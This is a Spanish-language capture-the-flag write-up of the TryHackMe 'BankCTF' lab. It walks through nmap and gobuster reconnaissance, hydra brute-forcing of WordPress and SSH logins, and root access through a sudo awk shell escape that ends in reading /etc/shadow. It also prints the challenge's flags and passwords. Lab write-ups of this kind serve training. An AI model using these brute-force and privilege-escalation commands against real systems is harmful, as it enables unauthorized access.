---
title: "BankCTF - TryHackMe"
layout: single
excerpt: "Maquina THM de dificultad facil, en esta maquina para principiantes para hackear un nuevo banco."
show_date: true
classes: wide
header:
  teaser: /assets/images/CTFs/BankCTF-THM/icon.png
  teaser_home_page: true  
  icon: /assets/images/TryHackMe-icon.png
categories:
  - TryHackMe
  - Easy
tags:
  - Linux
  - Web
---

# Reconocimiento 🔎 

Vamos a comenzar con un escaneo de los puerto mediante nmap:
```bash
nmap -sV 10.10.62.215
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-25 18:33 CEST
Nmap scan report for 10.10.62.215
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Si vamos a servicio web y vemos el código fuente, vemos que existe un `robots.txt`.<br>
![BankCTF](/assets/images/CTFs/BankCTF-THM/1.png)

Y si vemos el fichero, podemos ver que es un wordlist así que la vamos a guardar:<br>
![BankCTF](/assets/images/CTFs/BankCTF-THM/2.png)

```bash
wget http://10.10.62.215/robots.txt
```

Ahora vamos ha empezar a enumerar directorios de la web con posibles directorios ocultos. Podemos usar `dirb` o `gobuster`:
```bash
gobuster dir -u http://10.10.62.215/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.62.215/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/04/25 18:30:36 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.62.215/wordpress/]
Progress: 87594 / 87665 (99.92%)
===============================================================
2023/04/25 18:37:10 Finished
===============================================================
```

Vamos a mostrar ese directorio que hemos encontrado:<br>
![BankCTF](/assets/images/CTFs/BankCTF-THM/3.png)

Me dirigido hacia este post:<br>
![BankCTF](/assets/images/CTFs/BankCTF-THM/4.png)

Y aquí he encontrado la primera flag:<br>
![BankCTF](/assets/images/CTFs/BankCTF-THM/5.png)

*THM{$1$acaa16770db76c1ffb9cee51c3cabfcf}*
<br><br>

Al saber que es un wordpres, sabemos que tiene su panel de login hacia el panel de administrador como en todos los wordpress:<br>

- [http://direccion-IP/wordpress/wp-login.php](http://direccion-IP/wordpress/wp-login.php)

Como hemos visto en el post de banking vimos un mensaje del manager hacia Patrick, es decir podemos saber que son dos posibles usuario en el panel de adminitrador.

Si lo introducimos, podemos ver que nos da la pista de que existen estos usuarios:<br>
![BankCTF](/assets/images/CTFs/BankCTF-THM/6.png) 
![BankCTF](/assets/images/CTFs/BankCTF-THM/7.png)

<br><br>

# Explotación 🔑

Vamos a utilizar `hydra` para hacer un ataque de fuerza bruta con lista que encontramos al principio de robots.txt:

```bash
hydra -l patrick -P robots.txt 10.10.62.215 http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR' -vV
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-25 19:47:23
[DATA] max 30 tasks per 1 server, overall 30 tasks, 101 login tries (l:1/p:101), ~4 tries per task
[DATA] attacking http-post-form://10.10.62.215:80/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.10.62.215 - login "patrick" - pass " 791021" - 1 of 101 [child 0] (0/0)
[ATTEMPT] target 10.10.62.215 - login "patrick" - pass " 729826" - 2 of 101 [child 1] (0/0)
[ATTEMPT] target 10.10.62.215 - login "patrick" - pass " 711523" - 3 of 101 [child 2] (0/0)
...
...
...
[ATTEMPT] target 10.10.62.215 - login "patrick" - pass "a6_123" - 100 of 101 [child 13] (0/0)
[ATTEMPT] target 10.10.62.215 - login "patrick" - pass "Vamos!" - 101 of 101 [child 21] (0/0)
[STATUS] attack finished for 10.10.62.215 (waiting for children to complete tests)
[VERBOSE] Page redirected to http[s]://10.10.62.215:80/wordpress/wp-admin/profile.php
[80][http-post-form] host: 10.10.62.215   login: patrick   password: Vamos!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-25 19:47:28
```

Vamos a volver a realizarlo pero con el usuario manager
```bash
hydra -l manager -P robots.txt 10.10.62.215 http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR' -vV
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
...
...
...
[VERBOSE] Page redirected to http[s]://10.10.62.215:80/wordpress/wp-admin/profile.php
[80][http-post-form] host: 10.10.62.215   login: manager   password: LiveHackLove666
1 of 1 target successfully completed, 1 valid password found
```
Tras extraer las contraseñas vamos a iniciar sesión en el usuario Patrick. Y en información de la biografia del usuario encontramos nuestra flag:<br>
![BankCTF](/assets/images/CTFs/BankCTF-THM/8.png)
<br>
Le damos el formato de flag de THM:
- *THM{$2$9dddd5ce1b1375bc497feeb871842d4b}*

Ahora como no tenemos permisos de administrador vamos a irnos a la cuenta de manager si los tiene. Y si nos vamos páginas vemos que tiene una en oculto `Bank Login` y si entramos podemos ver que extá la siguiente flag:<br>
![BankCTF](/assets/images/CTFs/BankCTF-THM/9.png)
<br>
- *THM{$3$6351e4efddc359eca697894df2bfd02d}*

Pero si vemos hay un texto en ASCII vamos a convertirlo en texto plano con la ayuda de cyberchef:

- [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

![BankCTF](/assets/images/CTFs/BankCTF-THM/10.png)
<br>
Si nos fijamos bien parece otra wordlist, así que la vamos a guardar. Para utilizar para entrar por ssh.

ASí que vamos a utilizar de nuevo la herramienta hydra conseguir acceso:
```bash
hydra -L wordlist_manager.txt -P wordlist_manager.txt 10.10.62.215 ssh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
...
...
...
[22][ssh] host: 10.10.62.215   login: cat   password: cat
1 of 1 target successfully completed, 1 valid password found
```


<br><br>

# Escalada de Privilegios 🚀

Teniendo las credenciales vamos acceder al usuario cat por ssh:
```bash
ssh cat@10.10.62.215
```

![BankCTF](/assets/images/CTFs/BankCTF-THM/11.png)

<br>
Hacemos un `ls` y obtenemos la siguiente flag:<br>

![BankCTF](/assets/images/CTFs/BankCTF-THM/12.png)<br>
![BankCTF](/assets/images/CTFs/BankCTF-THM/13.png)

- *THM{$4$72545f3f86fad045a26ed54abd2bbb9f}*

<br>
Ahora para escalar los privilegios podemos hacer uso de `sudo -l` para ver los ficheros que tiene permisos de ejecución sudo desde el usuario cat.<br>

![BankCTF](/assets/images/CTFs/BankCTF-THM/16.png)<br>

Vemos lo ficheros que tienen permisos root que puedo ejecutar desde el usuario cat.
- En este caso tenemos un script
- Y la posibilidad de usar el comando awk.

Con la ayuda de gtfogins podemos ver como ejecutar comando con sudo con el comando awk:
- [https://gtfobins.github.io/](https://gtfobins.github.io/)<br>

![BankCTF](/assets/images/CTFs/BankCTF-THM/17.png)<br>

Así que vamos a ejecutar el siguiente comando para conseguir una bash con permisos root:
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```
![BankCTF](/assets/images/CTFs/BankCTF-THM/18.png)<br>

Tras una búsqueda he encontrado la siguiente flag en el `/etc/shadow`:<br>

![BankCTF](/assets/images/CTFs/BankCTF-THM/20.png)<br>

- *THM{$5$639bae9ac6b3e1a84cebb7b403297b79}*

<br>

Y si nos vamos al directorio de root vamos a lograr ver la última flag:<br>

![BankCTF](/assets/images/CTFs/BankCTF-THM/19.png)<br>

- *THM{$6$7b63d1cafe15e5edab88a8e81de794b5}*

<br>

**Enhorabuena, conmpletaste la room.**


<br><br>

---

<br>
Espero que te haya servido de ayuda este post. Me ayudarías mucho si lo compartes en tus **RRSS**, GRACIAS!